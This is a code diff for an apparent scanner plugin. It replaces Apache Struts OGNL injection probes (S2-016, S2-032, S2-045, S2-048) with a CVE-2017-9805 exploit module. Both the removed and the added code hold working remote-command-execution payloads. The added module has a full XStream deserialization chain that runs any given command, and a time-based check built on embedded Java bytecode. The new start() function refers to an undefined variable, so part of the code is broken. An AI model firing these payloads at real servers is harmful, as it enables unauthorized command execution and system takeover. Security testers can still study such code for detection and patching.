@@ -1,85 +1,240 @@
-import random
+#!/usr/bin/env python3
+# coding=utf-8
+# *****************************************************
+# Apache-Apache-struts-pwn: Apache Struts CVE-2017-9805 Exploit
+# Author:
+# Lone Ranger ultimate31337[at]gmail[dot]com
+# This code is based on:
+# https://github.com/rapid7/metasploit-framework/pull/8924
+# *****************************************************
+
 import requests
-import http.client
-from urllib import request
-from apps.tasks.lib.verify import get_list
-from apps.tasks.lib.random_header import get_ua
-from lib.wechat_notice import wechat
 from loguru import logger
-from multiprocessing.dummy import Pool as ThreadPool
 
-vuln = ['java', 'jsp']
+try:
+    import requests.packages.urllib3
+    requests.packages.urllib3.disable_warnings()
+except Exception:
+    pass
 
 
-class struts():
-    def __init__(self, ip):
-        self.url = ip
-        self.result = []
-        self.random = random.randint(100000000, 200000000)
-        self.win = 'set /a ' + str(self.random)
-        self.linux = 'echo ' + str(self.random)
-        self.timeout = 3
+def url_prepare(url):
+    url = url.replace('#', '%23')
+    url = url.replace(' ', '%20')
+    if ('://' not in url):
+        url = str('http') + str('://') + str(url)
+    return(url)
 
-    def st016(self):
-        payload = r"/default.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27" + self.linux + "%27%29.getInputStream%28%29%29%7D"
-        try:
-            r = requests.get(self.url + payload, headers=get_ua(), allow_redirects=False, verify=False)
-            if str(self.random) in r.headers['Location'] and len(r.headers['Location']) < 15:
-                self.result.append('Apache S2-016 Vulnerability: ' + self.url)
-        except:
-            pass
 
-    def st032(self):
-        payload = r"/?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.logger.info(%23str),%23w.close(),1?%23xx:%23request.toString&cmd={}&pp=\\A&ppp=%20&encoding=UTF-8".format(
-            self.linux)
-        try:
-            r = requests.get(self.url + payload, headers=get_ua(), timeout=self.timeout, verify=False)
-            if str(self.random) in r.text and len(r.text) < 11:
-                self.result.append('Apache S2-032 Vulnerability: ' + self.url)
-        except:
-            pass
+def exploit(url, cmd, dont_print_status_on_console=False):
+    url = url_prepare(url)
+    if dont_print_status_on_console is False:
+        logger.info('\n[*] URL: %s' % (url))
+        logger.info('[*] CMD: %s' % (cmd))
+    cmd = "".join(["<string>{0}</string>".format(_) for _ in cmd.split(" ")])
 
-    def st045(self):
-        try:
-            cmd = self.linux
-            header = dict()
-            header[
-                "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
-            header[
-                "Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#iswin?(#cmd='" + cmd + "'):(#cmd='" + cmd + "')).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
-            r = request.Request(self.url, headers=header)
-            text = request.urlopen(r).read()
-        except http.client.IncompleteRead as e:
-            text = e.partial
-        except:
-            pass
-        if 'text' in locals().keys():
-            self.random = str(self.random)
-            if self.random.encode('utf-8') in text and len(text) < 15:
-                self.result.append('Apache S2-045 Vulnerability: ' + self.url)
+    payload = """
+<map>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString>
+      <flags>0</flags>
+      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+        <dataHandler>
+          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
+            <is class="javax.crypto.CipherInputStream">
+              <cipher class="javax.crypto.NullCipher">
+                <initialized>false</initialized>
+                <opmode>0</opmode>
+                <serviceIterator class="javax.imageio.spi.FilterIterator">
+                  <iter class="javax.imageio.spi.FilterIterator">
+                    <iter class="java.util.Collections$EmptyIterator"/>
+                    <next class="java.lang.ProcessBuilder">
+                      <command>
+                        {0}
+                      </command>
+                      <redirectErrorStream>false</redirectErrorStream>
+                    </next>
+                  </iter>
+                  <filter class="javax.imageio.ImageIO$ContainsFilter">
+                    <method>
+                      <class>java.lang.ProcessBuilder</class>
+                      <name>start</name>
+                      <parameter-types/>
+                    </method>
+                    <name>foo</name>
+                  </filter>
+                  <next class="string">foo</next>
+                </serviceIterator>
+                <lock/>
+              </cipher>
+              <input class="java.lang.ProcessBuilder$NullInputStream"/>
+              <ibuffer/>
+              <done>false</done>
+              <ostart>0</ostart>
+              <ofinish>0</ofinish>
+              <closed>false</closed>
+            </is>
+            <consumed>false</consumed>
+          </dataSource>
+          <transferFlavors/>
+        </dataHandler>
+        <dataLen>0</dataLen>
+      </value>
+    </jdk.nashorn.internal.objects.NativeString>
+    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
+  </entry>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+  </entry>
+</map>
+""".format(cmd)
 
-    def st048(self):
-        cmd = self.linux
-        payload = "name=%25%7B%28%23_%3D%27multipart%2fform-data%27%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27" + cmd + "%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&age=123&__cheackbox_bustedBefore=true&description=123"
-        payload = payload.encode('utf-8')
-        try:
-            r = request.urlopen(self.url + '/integration/saveGangster.action', payload)
-            text = r.read()
-        except http.client.IncompleteRead as e:
-            text = e.partial
-        except:
-            pass
-        if 'text' in locals().keys():
-            self.random = str(self.random)
-            if self.random.encode('utf-8') in text and len(text) < 15:
-                self.result.append('Apache S2-048 Vulnerability: ' + self.url)
+    headers = {
+        'User-Agent': 'Apache-struts-pwn (https://github.com/Lone-Ranger/apache-struts-pwn_CVE-2017-9805)',
+        # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
+        'Referer': str(url),
+        'Content-Type': 'application/xml',
+        'Accept': '*/*'
+    }
 
-    def run(self):
-        self.st032()
-        self.st045()
-        self.st016()
-        self.st048()
-        return self.result
+    timeout = 3
+    try:
+        output = requests.post(url, data=payload, headers=headers, verify=False, timeout=timeout, allow_redirects=False).text
+    except Exception as e:
+        logger.info("EXCEPTION::::--> " + str(e))
+        output = 'ERROR'
+    return(output)
+
+
+def check(url):
+    url = url_prepare(url)
+    logger.info('\n[*] URL: %s' % (url))
+
+    initial_request = exploit(url, "", dont_print_status_on_console=True)
+    if initial_request == "ERROR":
+        result = False
+        logger.info("The host does not respond as expected.")
+        return(result)
+
+    payload_sleep_based_10seconds = """
+<map>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString>
+      <flags>0</flags>
+      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+        <dataHandler>
+          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
+            <is class="javax.crypto.CipherInputStream">
+              <cipher class="javax.crypto.NullCipher">
+                <initialized>false</initialized>
+                <opmode>0</opmode>
+                <serviceIterator class="javax.imageio.spi.FilterIterator">
+                  <iter class="javax.imageio.spi.FilterIterator">
+                    <iter class="java.util.Collections$EmptyIterator"/>
+                    <next class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" serialization="custom">
+                      <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
+                        <default>
+                          <__name>Pwnr</__name>
+                          <__bytecodes>
+                            <byte-array>yv66vgAAADIAMwoAAwAiBwAxBwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu
+dFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA
+EkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJD
+bGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5
+bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94
+c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2Vy
+aWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFs
+YW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUv
+eG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9u
+cwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29t
+L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3Vu
+L29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7
+KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1B
+eGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFs
+L3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMu
+amF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNs
+ZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRp
+bWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcv
+YXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFs
+L3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQAQamF2YS9sYW5nL1RocmVhZAcAKgEA
+BXNsZWVwAQAEKEopVgwALAAtCgArAC4BAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVy
+MTY3MTMxNTc4NjQ1ODk0AQAgTHlzb3NlcmlhbC9Qd25lcjE2NzEzMTU3ODY0NTg5NDsAIQACAAMA
+AQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0A
+AAAGAAEAAAAuAA4AAAAMAAEAAAAFAA8AMgAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0A
+AAAGAAEAAAAzAA4AAAAgAAMAAAABAA8AMgAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAa
+AAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA3AA4AAAAqAAQAAAABAA8AMgAA
+AAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAiAAMA
+AgAAAA2nAAMBTBEnEIW4AC+xAAAAAQAwAAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ
+</byte-array>
+                            <byte-array>yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu
+dFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA
+EkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2Vy
+aWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2
+YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xh
+bmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRp
+bC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQAB
+AAAABSq3AAGxAAAAAgANAAAABgABAAAAOwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAA
+AAoAAQACABYAEAAJ</byte-array>
+                          </__bytecodes>
+                          <__transletIndex>-1</__transletIndex>
+                          <__indentNumber>0</__indentNumber>
+                        </default>
+                        <boolean>false</boolean>
+                      </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
+                    </next>
+                  </iter>
+                  <filter class="javax.imageio.ImageIO$ContainsFilter">
+                    <method>
+                      <class>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</class>
+                      <name>newTransformer</name>
+                      <parameter-types/>
+                    </method>
+                    <name>foo</name>
+                  </filter>
+                  <next class="string">foo</next>
+                </serviceIterator>
+                <lock/>
+              </cipher>
+              <input class="java.lang.ProcessBuilder$NullInputStream"/>
+              <ibuffer/>
+              <done>false</done>
+              <ostart>0</ostart>
+              <ofinish>0</ofinish>
+              <closed>false</closed>
+            </is>
+            <consumed>false</consumed>
+          </dataSource>
+          <transferFlavors/>
+        </dataHandler>
+        <dataLen>0</dataLen>
+      </value>
+    </jdk.nashorn.internal.objects.NativeString>
+    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
+  </entry>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+  </entry>
+</map>
+"""
+    headers = {
+        'User-Agent': 'Apache-struts-pwn (https://github.com/Lone-Ranger/apache-struts-pwn_CVE-2017-9805)',
+        # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
+        'Referer': str(url),
+        'Content-Type': 'application/xml',
+        'Accept': '*/*'
+    }
+
+    timeout = 8
+    try:
+        requests.post(url, data=payload_sleep_based_10seconds, headers=headers, verify=False, timeout=timeout, allow_redirects=False)
+        # if the response returned before the request timeout.
+        # then, the host should not be vulnerable.
+        # The request should return > 10 seconds, while the timeout is 8.
+        result = False
+    except Exception:
+        result = True
+    return(result)
 
 
 def start(**kwargs):
@@ -87,8 +242,20 @@ def start(**kwargs):
     policy = kwargs['policy']
     assets = kwargs['assets']
 
-    output = []
-    probe = get_list(ip, ports)
-    for i in probe:
-        output.extend(struts(i).run())
-    return output
+    for webapp in webapps:
+        url=webapp.subdomain
+        cmd='echo test > /tmp/apache-struts-pwn'
+        do_exploit=False
+
+        if not do_exploit:
+            result = check(url)
+            output = '[*] Status: '
+            if result is True:
+                output += 'Vulnerable!'
+            else:
+                output += 'Not Affected.'
+            logger.info(output)
+        else:
+            exploit(url, cmd)
+            logger.info("[$] Request sent.")
+            logger.info("[.] If the host is vulnerable, the command will be executed in the background.")
